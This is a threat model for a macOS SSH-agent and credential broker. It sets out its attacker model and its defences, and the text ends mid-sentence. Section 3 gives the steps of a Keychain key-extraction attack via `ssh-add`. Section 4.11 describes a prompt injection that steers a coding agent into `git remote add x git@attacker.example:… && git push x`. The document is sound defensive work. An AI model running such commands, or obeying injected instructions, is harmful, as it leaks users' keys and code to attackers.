# nazar threat model

This is the long version of the threat model in the [guide](GUIDE.md#threat-model). The
authoritative design is [the spec](design/nazar-design.md) (section 8 for
the threat model); the measured facts it relies on are the spikes of spec section 11, and what
only a person can confirm is listed in spec 10.1 (attended checks). Where this file and the
spec disagree, the spec wins.

Scope: Phase 1, the `ssh` module, and from Milestone 8 how `secrets` are stored and which rules
decide a request for one (4.1, 4.4, 4.6, 4.8, 5.9, 5.11), and from Milestone 12 the `k8s` module's
`ca-cert` credentials (4.4, 4.6). The rest of the `secrets` module and the later `k8s` providers are
noted where they change the picture; the secrets design's section 10 and the k8s design's section 10
are their full lists.

## 1. Assets

| Asset | Why it matters |
|---|---|
| SSH private keys | Log in to servers and GitHub, sign git commits and tags |
| Secret values (Phase 2) | API tokens and the like; each sealed to its own Secure Enclave key, kept in the Vault |
| The approved config | Decides who may use which key, and how easily |
| Remembered approvals | Let callers sign without a prompt until they end |
| Pins: `app:` team IDs | Make app matchers unfakeable |
| The audit trail | Answers "what touched my GitHub key this week?" |

## 2. Attacker model

**In scope**

- **Malware or a compromised tool running as you**, without root. It can read and write your
  files, start processes, open sockets, run `ssh-add`, open terminal windows with
  `open -a Terminal`, and edit `~/.nazar/config/config.yaml`.
- **A remote host you connect to with agent forwarding** (`ssh -A`), which can send sign
  requests through the forwarded agent.
- **An AI coding agent or script doing more than you meant**, for example Claude Code running a
  command that uses a key you didn't expect it to use.
- **Theft of backups, disk images or a copy of your home folder.**

**Out of scope**

- Root or kernel compromise.
- Physical attacks on the Secure Enclave.
- Someone who knows your Mac password, or holds your unlocked Apple Watch, and is at your Mac.
- What a server does with the access a key gives.

## 3. The attack that motivated nazar

A passphrase saved in the Keychain (`ssh-add --apple-use-keychain`) protects the key file only
at rest. Verified on macOS 27, with a throwaway key and nothing else running:

1. The attacker starts its own agent on a socket it controls.
2. It runs `SSH_AUTH_SOCK=<its socket> /usr/bin/ssh-add --apple-load-keychain </dev/null`,
   with no terminal, no `SSH_ASKPASS` and no `DISPLAY`.
3. `ssh-add` reads the passphrase from the Keychain without a dialog, decrypts the key file and
   sends the full private key to the fake agent (`ADD_IDENTITY`).
4. The fake agent signs with it; `ssh-keygen -Y verify` accepts the signature.

`security find-generic-password` couldn't see the stored passphrase at any point, so an audit
with `security` would miss it.

A Secure Enclave key has no key file for `ssh-add` to decrypt, so this attack has nothing to
export. nazar's agent also refuses `ADD_IDENTITY`, `REMOVE_*`, `LOCK`/`UNLOCK` and unknown
extensions, so nothing can load keys into it or remove them.

## 4. What nazar protects against

### 4.1 Key theft

Keys are created with CryptoKit inside the Secure Enclave and never leave it: not to disk, not
to memory, not to the caller. A key's `dataRepresentation` is an encrypted handle that only this
Mac's Secure Enclave can use.

**Handles are still sensitive.** Phase 0 (S5) showed that *any* process on the same Mac can sign
with a handle created without user presence: a different ad-hoc-signed binary signed in 6 ms
with no prompt, bypassing nazar entirely. So handles are **never stored as plain files**. They
go in a login Keychain item whose access list trusts only the agent, `nazar-agent`, by its
signature (4.10). Otherwise malware could read the handle and use a `dialog`- or `none`-gated
key directly, skipping nazar.

**Checked by hand** (spike S5, spec 10.1; 0.1.1, Developer ID, 7 Nov 2026): that access list
is the *whole* protection for `dialog`/`none` keys, and it holds. Another process (`security
find-generic-password`) reading the item gets a Keychain dialog, never the value silently; a
user who clicks Allow gives that process the handle, so only keys whose gates are all
`login`/`block` (section 4.8) stay safe then. Another process can delete or replace the item
without a dialog: the key is destroyed (nazar can't read the replacement and reports it), never
stolen. A planted item is not trusted; a locked keychain fails without an unlock dialog. See
also 5.11.

**Secrets (Phase 2, Milestone 8)** are stored the same way, in one Vault item each
(`secret/<name>`): the handle of the secret's own Secure Enclave key-agreement key and the value
sealed to that key with HPKE (RFC 9180, Go's `crypto/hpke`). No file is written, plaintext or
sealed. A copy of the Keychain database taken off this Mac opens nothing; the item is as
sensitive as an ssh key's handle, for the same S5 reason, and secret keys have no Secure Enclave
user presence yet (4.8), so the access list is their whole protection against another process
(5.11).

**Kubernetes credentials** (Milestone 12, `ca-cert`) are never stored. Each context has a
certificate authority whose P-256 key lives in the Secure Enclave and never leaves it (its
handle and certificate are in the Vault item `k8s-ca/<context>`); every allowed request gets a
fresh client certificate for a throwaway key, valid `ttl_cert` (15 minutes by default). What can
be stolen from disk, a backup or kubectl's memory dies with that certificate. nazar never
reads, copies or rewrites the kubeconfig's existing credential: `nazar k8s ca create`
adds a context, cluster and user of its own beside it, reading only the `contexts:` and
`clusters:` entries. That credential stays where the user keeps it, as strong or weak as before;
the one copy nazar makes is the `.nazar-backup-*` file of the whole kubeconfig it keeps beside it
(0600, the same content as the file it replaced) until the user deletes it. The context's
identity is `<user>-nazar` with no groups, given its role by a ClusterRoleBinding the user can
delete; `system:masters`, which bypasses RBAC and can't be revoked, is never minted by default.

### 4.2 Silent use outside an approved scope

Every sign request is resolved to a caller chain, matched against the key's rules, and needs a
remembered approval or a fresh gate. Callers no rule matches fall to the key's own gate or
`defaults.fallback`, which is `gate: block`: refused at once, with a warning window that has
**no allow button**.

- **Peer identity** comes from the socket's audit token (`LOCAL_PEERTOKEN`), not a bare PID,
  so a recycled PID can't impersonate the original.
- **Unknown chains** (no GUI app found, for example an ssh `ControlPersist` master that has
  detached to `launchd`) are matched by `apps: [any]` or `apps: [unknown]`, never by `app:`, and by a
  `signed:` matcher only for a process that is in the chain (a chain cut off before
  `launchd` not even that). They are **never** covered by a remembered approval,
  and get a dialog with an **Unknown app** header that names the process that matched, unless
  the rule is `gate: none` (for `any`/`unknown`, `config check` warns: every program can then
  use the key without a prompt; each use is still logged). What the `signed:` match
  concedes is 5.12. An app found
  only through macOS's "responsible process" lookup is shown for information but is not an
  identity: it never matches `app:`/`signed:` and nothing is remembered under it.
- **A caller is offered only the keys it may use** (Milestone 7, spec 5): `REQUEST_IDENTITIES`
  lists the keys whose policy for the chain is not `block`. ssh and `ssh-keygen` never ask to
  sign with a key the agent did not list, so a program outside a key's rules stops at the
  listing; one that asks to sign with a withheld key anyway (its public key is readable in
  `~/.nazar/keys`) is judged and blocked like any other request. Hiding is not the
  gate, and it leaks nothing: the public keys are on disk for anyone running as the user.
- **A tab whose app restarted keeps its app** (Milestone 7, spec 4.1 step 3): iTerm2's tabs
  live on under its helper `iTermServer` when iTerm2 updates and restarts, and a helper nazar
  saw directly below iTerm2 then stands for the iTerm2 running now, with the tab's own
  session. What that can and cannot be made to do is 5.14.
- **Approvals are per rule, per receiver, and per destination or kind of signature**
  (Milestone 7, 4.11). Approving Claude Code's rule in a tab doesn't approve an `apps: [any]`
  rule in the same tab; approving a login to github.com there doesn't approve a login to any
  other server, nor git signing.
- **An approval given to a tool is that tool's run** (Milestone 7, spec 4.1 step 4): when a
  `scope: session` rule was satisfied by a non-Apple `signed:` process below the
  tab's shell (Claude Code), the approval is keyed by that process (PID and start time) and
  watched like a shell. It covers what the run starts, a nested `claude -p` included, and
  nothing in the tab outside it: a second `claude` in the tab, or one a script in the tab
  starts, asks again. It is never wider than the tab's approval was.
- **Approvals end** when the tab's shell exits (`session`), or the tool's process for an
  approval given to a run, the app quits (`app`), `expire` runs out (compared on wall-clock
  time, so a Mac asleep overnight doesn't stretch an 8h approval), or you run `nazar revoke`.
  They live only in memory and never survive a restart.

### 4.3 Callers pretending to be an allowed app

Only matchers that can't be faked by name can appear in `apps:`:

| Matcher | Checks | How it can fail |
|---|---|---|
| `signed: {team, id}` | Code-signing team ID and signing identifier, on **any** process in the chain, ancestors included | It names a publisher's binary, not an intent: if that binary runs arbitrary commands (an AI coding agent, an interpreter, a task runner), everything it runs, and anything that can start it, is covered (5.12) |
| `app: <bundle id>` | Bundle ID, plus the team ID pinned when the config was approved (from the installed app's signature) | An unpinned bundle ID matches nothing; a team mismatch doesn't match and is noted |
| `path: <file>` | The executable the kernel reports for **any** process in the chain (never argv[0]), against the rule's path with its symlinks resolved at that moment, or the path as written. No hash is pinned | Whoever can write that file, or a folder above it, gets the rule: under `/opt/homebrew` that is **every program running as you**. Narrower than `unknown`, weaker than `signed:` |

There is no `name:` matcher. `path:` is for an unsigned program with no signed app or tool above
it (a Homebrew daemon launchd starts: ad-hoc, no team ID, so `signed:` can't name it). A path
rule is only as safe as who can write that file: a program of yours that replaces
`/opt/homebrew/Cellar/<formula>/…/bin/<x>`, or repoints the `opt/` link, runs as that program
and gets its rule, silently under `gate: none`. `nazar config check` warns about every `path:`
whose file or folder you can write. It is still narrower than `unknown`, which any program can
reach by leaving its chain. Resolving symlinks each time keeps a rule on the `opt/` link working
after `brew upgrade` without a re-trust step, which is what a hash pin cost before: the
pin added little, since whoever could replace the file could also run the pinned binary with
inputs of their choosing. A config approved while `path:` matched nothing is held without its
`path:` matchers until it is approved again (spec 4.8), so the upgrade loosens nothing by
itself: what was approved under the new meaning is recorded in a vault item of its own, never in
the config, which any process of the user could have written while a new `path:` rule needed no
approval. `command:` (an exact argv that nazar itself starts) exists only for `to:` receivers in
the `secrets` module.

### 4.4 Easy rules that would mean "everyone"

Shells, `login`, interpreters and other system binaries are in almost every caller chain. So
`gate: none` (silent) accepts `app:` matchers, `signed:` matchers whose team isn't Apple,
`path:` matchers outside the system volume, and
`any` / `unknown`, which say "every program" outright and get a warning: that is the user's
choice. Any Apple-signed matcher, and any `path:` under `/System`, `/bin`, `/sbin` or `/usr`
(outside `/usr/local`), is rejected under `gate: none` by
`nazar config check` and by config loading. They remain allowed under `login` and `dialog`,
which still put a person in the loop. Restricting the matcher kinds removes the mistakes that
come from *Apple's* ubiquitous binaries; blocking individual binaries would always miss one. It
does **not** catch a non-Apple interpreter or tool that runs arbitrary code (python.org Python, a
signed Node, Claude Code): a `gate: none` rule on such a `signed:` matcher silently covers every
script it runs, and nazar can't tell. That is left to you; see 5.12.

A secret's value leaves nazar, so its rules are stricter (Milestone 8): `apps: [any]` or `unknown`
under `gate: none` is refused, not warned about. A silent secret rule names an `app:` or third-party
`signed:` matcher, and it covers every child of that app, with any delivery method and with or
without `to:`. nazar can't tell one child from another: under a silent rule for Claude Code, its
Bash tool and any script that runs (an npm install script, say) get the value with no prompt, and
a value on stdout goes wherever that program sends it. Programs outside the app stay refused, and
adding the rule asks for approval like any other loosening. Accepted
risk for `nazar run`: `npx` picks what it runs from the registry and from files the user can edit, so a
compromised package version gets the key with no dialog. The dialog gave little against that
anyway: it showed the same command line for the bad version as for a good one.

A Kubernetes context's credential leaves nazar too (Milestone 12), so its rules have the
secret's stricter rule: `apps: [any]` or `unknown` under `gate: none` is refused. Its rules are
judged on whoever ran the program that asks (kubectl, helm, k9s …), never on that program: a
rule naming kubectl is refused, since it would let every program kubectl runs (a `kubectl-<name>`
plugin anyone can put on PATH) pass.

There is no list of client programs (since 2026-10-31; k8s design 2.1, "no client list"). As
for an SSH key, the caller chain is the boundary: whatever program runs the plugin, identified by
its code signature, receives the credential when the chain above it passes the rules. A program
outside every allowed chain gets nothing, whatever it runs; a program inside one could use the
cluster through kubectl anyway. What that gives up: any program in an allowed chain (a script
Claude Code runs under a rule for Claude Code, say) can hold a certificate itself, for at most
`ttl_cert` (15 minutes by default), and use or send it from there, where a client list made it go
through kubectl. Approvals stay per program (the receiver is part of the key), so one given to
kubectl in a tab does not cover helm there. The stdout check (5.16) still keeps the credential
from a file, a terminal or any process but the one that ran the plugin.

### 4.5 Faking an approval

- **`login`** is LocalAuthentication `deviceOwnerAuthentication`: Touch ID, Apple Watch or Mac
  password. An ordinary process can't answer it.
- **`dialog`** shows **Deny** and **Allow** buttons. Allow is greyed out until the dialog has
  been the focused window for 1 second, and greys out again whenever focus leaves it, so a
  click or typing aimed at another window can't approve. Only a click from a real mouse or
  trackpad counts: posted clicks are ignored (and counted on screen), an Accessibility press
  never counts as Allow (the button refuses `AXPress`, and a press that reached its action
  anyway carries no hardware mouse-down, so it is ignored and counted like a posted click), and
  no key presses a button (Esc denies). Secure Event Input is on while it's shown. **Caveat:**
  telling hardware clicks from synthetic ones on macOS 27 is still being verified (spike S4, at
  risk): a poster can set the event's source PID to 0, and
  whether WindowServer overwrites it is unknown. If it doesn't, a process with the Accessibility
  permission alone could click Allow once it's enabled. macOS asks you before granting
  Accessibility. The earlier random-key dialog also needed Screen Recording to read the key; the
  buttons don't have that second hurdle.
- **Residual: a window drawn over the dialog (UI redress).** Any process of yours can open a
  window of its own, without any permission, and place it over the nazar dialog: a transparent or
  look-alike overlay that leaves a hole over Allow, or a fake "Continue" button where Allow will
  be, so that your own, genuine click lands on Allow while you believe you are clicking
  something else. The click is real hardware input, so the hardware check doesn't catch it. The
  1-second arming (Allow counts only after the dialog has been the focused window for 1 second
  without a break, and the clock restarts whenever focus leaves it) narrows this: an overlay that
  takes focus disarms Allow. It doesn't remove it: a non-activating overlay can sit above the
  dialog while the dialog keeps focus. Read the dialog before you click, and prefer `login`
  (Touch ID / password, drawn by macOS) for keys that matter.

### 4.6 Malware editing the config

The config is an ordinary file in your home, so malware could add a rule for itself. nazar
therefore keeps the **last approved config** active and treats the file as a proposal:

- Edits are validated and classified. Changes that **loosen** anything (new rules or apps,
  weaker gates, a new `app:` pin, moving the agent socket, `audit.args: none`) are staged; nazar
  shows the diff and asks for the `login` gate, never `dialog`. Until then nothing changes.
- Classification is semantic, because under first-match rules removing or reordering a rule can
  let a looser later rule apply.
- Changes that only **tighten** apply at once.
- A `secrets:` entry is judged like a key: its rules by the same first-match proof, and a
  delivery method added to its `deliver:` list loosens. A method or field this version does not
  build yet is refused by name, so it can't be approved now to work after an upgrade, and the
  default `deliver` never grows.
- A `k8s:` context is judged like a key too (Milestone 12), and on top any change to its
  `cluster` (which re-points the credential at another server), its `identity`, its
  `credential`, a leftover `clients:` line removed (such a context is off: refused to every
  caller, while the rest of the config stays in force), and a longer `ttl_cert`, loosens
  whatever its rules say; a context added loosens even when it
  blocks everyone, so one removed and added back can't change those silently. An approved
  change of any of them also ends the approvals given for the old credential. Fields of later
  k8s providers are refused by name. `nazar k8s ca create` makes a context's CA and writes its
  entry on one login prompt that shows each, its identity and its cluster (the server, the CA's
  whole fingerprint as openssl prints it on the node, the TLS server name and proxy), makes
  nothing if `config.yaml` changed while the prompt was open, and undoes the earlier steps when a
  later one fails. It pins no program. The server's CA it pins is the one the user saw as a fingerprint at the terminal, or,
  without a terminal, the one of the kubeconfig cluster with exactly the server given (several
  that differ are refused); a kubeconfig any process of the user can write, or a pty that looks
  like a terminal, could name a false server or CA either way, so the prompt is the check: it
  shows them, and check 2 then holds kubectl to them. The kubeconfig's temp file, a whole copy
  of it, is removed if the CLI is interrupted while the prompt is open. `nazar k8s rule add|set|remove` (Milestone 13) edits a context's rules
  with the code that edits a key's, so a loosening is staged and waits for the login gate; it
  edits only a context the approved config has, never its own gate, cluster, identity or
  `ttl_cert`, and never a `to:` (the CLI, nazar-agent, the edit and the parser each refuse
  one). A rule edit of nazar's own that loosens access is written only with
  `--allow-loosen-access`, and the CLI then sends at once the `config apply` bound to it, so the
  one prompt lists exactly what loosens and the audit line names the caller; without the flag
  nazar-agent classifies the edit first and refuses it with those same lines (exit 2), writing
  nothing and prompting nothing.
- `nazar trust --app`, `ssh-key create` and `ssh-key delete` need the same authentication.
- A missing or unknown `apiVersion`/`kind` is refused; nazar never guesses at a schema.
- Each field has one shape and one meaning (`apps:` and `to:` are always lists; no `to: [any]`;
  Apple's team only as `apple`; `scope` and `expire` only where they do something). The rewrite
  of an older file (spec 4.8) runs at nazar-agent's start and gives a process that can write
  `config.yaml` nothing: the approved config is rewritten from the vault's own item, never from
  the file, and kept only when it means exactly the same; the file's rewrite is then judged like
  any edit, so a file that was not the approved config stays a proposal. A team written `Apple`
  matched nothing and `apple` matches Apple's programs, so it is never rewritten: the approved
  config keeps it (still matching nothing) and the file stays invalid until you fix it, a fix to
  `apple` asking for Touch ID like any loosening.
- Repeated edits can't flood you with prompts: prompting is throttled, and a refused
  `config apply` is audited with its caller.

The CLI never prompts on stdin and has no way to approve on its own: an agent can inspect,
propose (a loosening without `--allow-loosen-access` is refused, exit code `2`, and shown) and
tighten, but only the person at the Mac can open access. An agent that passes the flag puts
one throttled, audited prompt on the screen, listing exactly what the change loosens, that only
the person can pass: the same prompt `nazar config apply` already gave any process, and no more
(the earlier distinction by terminal was bypassable with a pseudo-terminal anyway). That agents
print the command rather than run it is policy, in AGENTS.md; nothing is decided in the CLI: it
sends the same requests any process could.

### 4.7 Forwarded agents

A remote host you `ssh -A` into can send sign requests through the forwarded socket.

- Forwarded requests **never use or create a remembered approval**, even inside an approved tab.
- Under `gate: none` they get a **one-time `dialog`** instead of going through silently.
- Session-bind is checked as OpenSSH's `ssh-agent` does: a bind that doesn't parse or verify, a
  duplicate session ID, or one past the bind limit marks the connection, and it then signs
  **nothing**.

**Condition:** nazar knows a connection is forwarded only because the *local* ssh client told it,
with a `session-bind@openssh.com` extension whose `is_forwarding` flag is set (OpenSSH 8.9 and
later do this). A forwarding client that sends no session-bind at all (OpenSSH before 8.9, Go
`x/crypto/ssh`, Paramiko, some IDE-embedded SSH clients) looks like a local caller: its requests
are judged by the local tab's chain and can use that tab's remembered approvals, and `gate: none`
stays silent for them. nazar can't detect forwarding any other way; the agent protocol carries no
other hint. If you forward agents with such a client, give the key `scope: use` **and no
`gate: none` rule**: `scope` only matters for gates that prompt, so a `none` rule stays silent for
these requests whatever the scope.

### 4.8 A compromised nazar process

A key's Secure Enclave access control is **fixed once, when `nazar ssh-key create` makes it**, from
the config entry the key gets (spec 4.5; since Milestone 7 `create` takes no gate). When every
policy that can reach the key is `block` or `login` with `scope: use`, and at least one is `login`
with `scope: use`, the key is created with `.privateKeyUsage` + `.userPresence`, so **the chip
itself** refuses to sign without your authentication, even if the nazar process is compromised;
otherwise it is created without. The entry `create` writes for a name without one (the key's own
`gate: block` plus a `login` / `scope: session` rule for the terminal it was typed in; `block`
alone from Nazar UI.app or an unknown chain) never gives presence: a chip-protected key is a
deliberate choice, `nazar ssh-key create <name> --always-ask`. Its entry is the key's own `gate:
block` plus a `login` / `scope: use` rule for the terminal (no terminal: `gate: block` alone, as
without the flag, so the flag never widens who may ask for the key), and the key gets presence
whenever every policy that can reach it is `block` or `login` / `scope: use`; nazar-agent checks
that before it shows the prompt (`createAuth`). For a name that already has an entry,
`--always-ask` never rewrites it and is refused unless every policy of that entry already fits.
The flag is only a request: the agent writes the entry and decides, and the CLI reports an error
if the key came back without presence (an older agent ignores the argument; the key it made then
has to be deleted by hand). Rules you add later, and their `scope`, don't change the key; only
re-creating it does (`core/daemon/handlers.go`, `sshKeyCreate`; `config.NeedsUserPresence`).
`ssh-key list --json` says `userPresence` from the key's vault record, written with the access
control the key was created with, not from config.yaml. Whether the key works while the Mac is
locked is fixed at creation the same way (`whileLocked`; 5.17).

What the chip guarantees is narrower than "this signature was authorised": LoginGate's
authentication is not bound to one key, and the chip honours an authenticated LAContext for 6–10
minutes (S1), so a compromised nazar holding any recent authentication (from a `config apply`, a
secret or a create prompt, say) could sign with a presence key in that window. An honest nazar
asks on every use; a compromised one can sign only within minutes of a Touch ID you gave it.

Scope matters for how it feels, not for whether it applies: Phase 0 (S1) showed the chip reuses
one authentication for a few minutes (at least 6, fewer than 10), not for a terminal session or
an app's lifetime. So on a presence key whose rules use `login` with `scope: session` or `app`,
nazar remembers the approval but the chip asks again every 6–10 minutes anyway. Spec 4.5 was
amended after S1 so that chip-level presence is used only for `login` + `scope: use` keys,
leaving `session`/`app` to nazar's own memory; since Milestone 7 `ssh-key create` follows it
(the entry decides), as the re-creation advice below already did.

Because presence is fixed at creation, the config can drift away from it. `nazar config check` and
`nazar status` compare each key's recorded policy with the gates the config now gives it, and warn
in both directions (`core/daemon/keyadvice.go`):

- **Created with presence, now reachable by `dialog` or `none`** (a rule, the key's own gate or
  `defaults.fallback`): requests that land on such a gate **fail closed**. The chip refuses to
  sign without authentication, so they get neither the dialog nor a silent signature, and the
  audit line says `key requires the login gate (it was created with Secure Enclave user
  presence)`. The warning says to re-create the key without user presence.
- **Created without presence, now only `block` or `login` with `scope: use`**: the warning says
  the key could be re-created with presence. Keys with `login` + `scope: session`/`app` aren't
  suggested, per S1.

Keys a `dialog` or `none` gate can reach are created without Secure Enclave user presence
(`Config.NeedsUserPresence`); nazar's own gate is their only check (and their handle's Keychain
access list, 4.1). That is a choice the key's rules make when it is created (the create prompt's
last line says `Touch ID on every use, enforced by the chip: …` or `Secure Enclave user
presence: off`, and the README says what decides it), so `config check` no longer warns about it
on every run (a warning about a deliberate choice read as a problem);
it still warns when a key's protection and its gates disagree. Since Milestone 7 nazar's own
edits (`rule add`, `rule set`, `ssh-key set`) that would give a user-presence key a gate it
cannot serve are refused outright (`<name> asks on every use (enforced by the chip); create
another key for a looser rule`), whether or not the edit loosens access when it is made: a rule
added behind another that shadows it is refused too, or removing the shadowing rule would
uncover it with one routine approval (security review of `--always-ask`, finding 1). So the
disagreement can only come from a hand edit you approve with `config apply`. Then a `dialog` or
`none` request fails at the chip, and a `login` rule with `scope: session` or `app` signs without
a prompt only for the minutes the chip honours the approval it remembers.

**Secret keys have no Secure Enclave user presence** (Milestone 8): spike S13 has not shown that
`KeyAgreement` honours a reused LAContext as `Sign` does, so every secret key is created
without it, whatever its gates. A compromised nazar process can therefore open every secret;
nazar's gate and the Vault's access list are the protection (secrets design 3.5).

**Kubernetes CA keys have no user presence either** (Milestone 12): a compromised nazar-agent can
mint certificates for every context while it runs, each valid at most `ttl_cert`. Rules that allow
a dialog or a session would make a user-presence CA unusable, and a new CA means adding it to
the cluster again, so the choice is left for later (k8s design 6.1).

### 4.9 Unexpected callers going unnoticed

Blocked callers get a warning window showing who tried (the full chain, command and folder) and
what for, deduplicated per caller and target with a counter. Every request, allowed or not, is
one line in the macOS unified log (subsystem `dev.nazar`, category `audit`, `default` level).
The log store is owned by root, so an entry once written can't be edited or erased without root
(`log erase` needs root). Reading it needs an admin account (spec 4.6).

Since Milestone 7 a caller outside every rule is reported when it asks which keys it may use,
which is where ssh and `ssh-keygen` stop once the agent lists none (4.2): one blocked audit line
per key, `operation="list keys"`, and the warning, per key. A caller with a rule for some key is
offered those and told nothing about the rest, in the list, on screen or in the log: it didn't
ask to use them, and if it asks to sign with one anyway that request is reported like any block.

That is **not** a tamper-proof audit trail, in two ways:

- **Forgery.** The unified log accepts an entry under any subsystem from any process.
  `nazar log` therefore keeps an entry only when the image that wrote it is the agent's own
  executable: today's build (by its Mach-O LC_UUID) or an earlier build that ran from the same
  installed path (Milestone 5; the log names each image by the path it first ran at, and records
  no signature, so this is the one check that goes by path). What still passes: a program built
  to carry the LC_UUID of a build of the agent that ran from that path, and a program run from
  that path itself (which could replace the agent outright). Console.app and `log show` show
  every entry, forged or not. A forger can't *remove* the real line about its own request, but it
  can bury it in plausible noise or plant lines blaming another caller. Since Homebrew installs
  every version into a new folder, `nazar log` after an upgrade no longer shows what earlier
  versions wrote (they ran from another path); `log show` still does.
- **Flooding.** Retention is by size and age (5.8), so a process that writes enough log traffic,
  under any subsystem, makes real entries age out sooner. nazar can't prevent that.

### 4.10 Identity is the signature, not the path

Milestone 6 (spec 4). Three checks decide which program is nazar's, and each goes by code
signature (a designated requirement: signing identifier and certificate), never by where the
program is:

| Who checks | Whom | Requirement |
|---|---|---|
| The agent's vault | its own Keychain items | the item's access list names the agent's own requirement (`AppIdentity`: requirement only; the recorded path is for messages) |
| The `nazar` CLI | the control socket's listener | team-signed CLI: `identifier "dev.nazar.agent"` signed by the CLI's own team (`anchor apple generic`, leaf OU); ad-hoc CLI: exactly the agent bundle it ships in (its cdhash) |
| Nazar UI.app | the CLI it runs | team-signed UI: `identifier "dev.nazar.cli"` of the UI's own team; ad-hoc UI: exactly the CLI build it pins (`NazarDevCLICDHash`) |
| nazar-agent (Milestone 8) | the control peer of a command that returns a secret's value (`secret.get`, `secret.helper`), or a run plan for one (`secret.run`, M10) | the UI's rule: `identifier "dev.nazar.cli"` of the agent's own team; ad-hoc agent: exactly the CLI build whose cdhash `make agent` compiled into the agent's code (`devCLIPin`). Checked by the connection's audit token on the agent's side, per request, and held to the peer of the resolved caller chain; same user is not enough. None of these checks requires the hardened runtime or refuses `get-task-allow` on the peer (every build nazar makes signs with the hardened runtime and no entitlements). **Known limit:** the token names the last process to touch the client socket, so a same-user process that shares the connection with a genuine CLI (an inherited descriptor, or the CLI exec'd over the process that connected) and stops it can pass the check and read the reply; a pass means "the process the token names is the genuine CLI", as for the CLI's check of the agent (codesign package doc). Closing it needs a per-message kernel identity (an XPC/Mach channel for value commands). A check of every process holding the connection does not close it: a reference to a socket can be held outside every descriptor table, where `proc_pidinfo` does not see it (M9-01, dropped). For git's credential helper (M8-04) the receiver check proves the CLI's parent, not where its stdout goes: whoever runs git with a helper command of its choosing gets the token, as with `GIT_TRACE_CURL` (secrets design 10) |

So a move or an upgrade keeps the keys (the same signature at another path is the same
program), and a binary at the trusted path with another signature is refused (pinned by tests:
`IdentityBySignatureTests`, `TestSameSignatureAtAnotherPathIsTheSamePeer`,
`TestAnotherSignatureAtTheSamePathIsRefused`, `VerifiedRunnerTests`, and on real processes with
the real kubectl, for check 0, `TestNazarK8sRealKubectl`). What
follows from it:

- **Anyone who can sign as the team is nazar.** That is the publisher (Developer ID) or, for a
  developer's own builds, their Apple Development certificate. A malicious build signed by the
  publisher is trusted like the real one (section 6).
- **Two signatures are two programs.** Every ad-hoc build, the old `Nazar.app` (bundle id
  `dev.nazar`) and moving between an Apple Development build and the Developer ID release all
  change the requirement: the new agent can't read the old one's Keychain items, nor delete
  them, and says so (`nazar status`): the user removes each with the `security
  delete-generic-password` line it prints, and keys are re-created once (`nazar ssh-key create`,
  under the entry and rules already approved). That line gives nothing away: it removes one
  item, named by a plain-word account, that the agent could not use; you can always remove an
  item of your own keychain (Keychain Access, `security`), and the key that replaces it is
  created behind the login gate. Nothing is ever read, changed or deleted automatically.
- **The UI checks the running CLI, not the file.** It starts the CLI suspended, checks the
  process's code against the requirement and only then lets it run, so a file swapped in after
  the locator looked at it is killed before its first instruction.
- **The CLI no longer trusts by path.** An ad-hoc CLI outside an agent bundle trusts no agent
  (it used to fall back to whatever the LaunchAgent plist named, a file any process of the user
  can rewrite).
- **A Kubernetes credential goes only to the genuine CLI** (Milestone 12): `k8s.credential` is a
  value command, checked like `secret.get` (check 0 of the k8s design). The CLI ignores the
  environment a kubeconfig's `env:` block can set: it dials the control socket in the home the
  user database names and checks the agent by its signature.

### 4.11 An approved tab steered to another destination

The case that motivates an agent guard most (Milestone 7): a Claude Code tab is approved for
`git push` to github.com, and something the agent reads (a README, an issue, a tool result)
makes it run `git remote add x git@attacker.example:… && git push x`, or sign a commit it was
not asked to sign. Before Milestone 7 the tab's remembered approval covered both silently.

- **A remembered approval covers one destination or one kind of signature** (spec 4.3): the
  approval key carries the server's **host key** as proved by the connection's verified
  `session-bind`, or the SSHSIG namespace, keyed apart from git commits and unrecognised data
  however it is spelled. The first login elsewhere, and the first commit signature, each get
  their own prompt, which says what the tab was already approved for.
- **The host key, not the name.** `~/.ssh/known_hosts` is the user's file; anything running as
  the user can write `github.com <attacker key>` into it. The name is for the dialog; the key
  decides. The dialog lists every name the file gives that key (up to four, then a count), so
  an alias added for a server does not hide the one the user typed; the caller's command line
  can move one of those names first but never adds one.
- **Only a proved host key counts.** A `session-bind` is recorded only when its signature by
  the host key verifies (4.7). A host key the userauth itself carries (`publickey-hostbound`)
  with no bind is the client's word: such a login is "unidentified", remembered apart from every
  proved server, and never rides on an approval for the server it claims. A replayed bind
  from a real github.com session can't be used for another session: the userauth must carry
  the bound session ID.
- **Logins with no bind at all** (clients that don't send `session-bind`, 4.7) are one kind,
  `login:unbound`, remembered on their own. They stay as weak as 4.7 describes: nazar can't tell
  one such server from another. Prefer clients that bind, or `scope: use`.

**Condition:** this narrows what an approval covers; it doesn't judge the command. A push to a
new remote still goes through once the user approves it, and anything inside the approved
destination (a push to a different github.com repository, a login to the same server as another
user) is 5.2.

### 4.12 A fake Kubernetes API server

Malware that edits a kubeconfig, or sets `KUBECONFIG`, can point the real kubectl at a server of
its own, hoping it gets a certificate the real cluster trusts. nazar records each context's
server, CA (a hash of the exact set of certificates), TLS server name and proxy in the approved
config, behind Touch ID, and refuses a request whose cluster differs, before any rule or prompt,
with the block warning (check 2). A request with `insecure-skip-tls-verify`, or without its
cluster info, is refused too. What check 2 reads is the cluster info kubectl hands the plugin;
a wrapper can forge it, but the credential then still reaches only kubectl (5.16).

### 4.13 An AWS credential for the wrong program or the wrong role

An AWS session is minted only for a request the entry's rules allow (aws design 6.1): the CLI
on the control socket must be the genuine nazar CLI (check 0), its parent identified by its code
signature (check 1), the chain above that parent allowed by the entry's rules (check 3), and its
stdout a pipe that parent alone reads, as in 5.16 (a wrapper that tees the output is refused
with `the credential's output does not go straight to the program that ran it`). There is no list
of client programs (aws design, "no client list", as k8s 4.4 above): whatever program runs
`credential_process` (the AWS CLI, boto3, terraform …) receives the session when the chain above
it passes the rules, and approvals are keyed per program; a rule naming `aws` is refused, since
it would pass every program aws runs. Nothing in the request but the entry's name addresses it:
the Roles Anywhere host, the ARNs and the duration come from the approved config, so a changed
`~/.aws/config` can point a program at another entry only, and gets that entry's credential only
if that entry's rules allow the caller. The entry is compared again at mint time; a change while the prompt was open mints
nothing and sends nothing. Each CA is one entry's (`aws-ca/<name>`, CN `nazar aws CA <name>`),
never a k8s context's. The CA key signs only certificates nazar built (a 10-minute client
certificate, CN the entry's identity, for a key that exists for one request in nazar-agent), and
the certificate and its key never leave nazar-agent: it signs the `CreateSession` request
itself and passes on only the session. nazar-agent talks to `rolesanywhere.<region>.amazonaws.com`
only, over TLS 1.2 or later with the system's roots, no proxy, no redirect, a 10-second
deadline and 64 KiB at most, and checks the reply (the role is the configured one, the
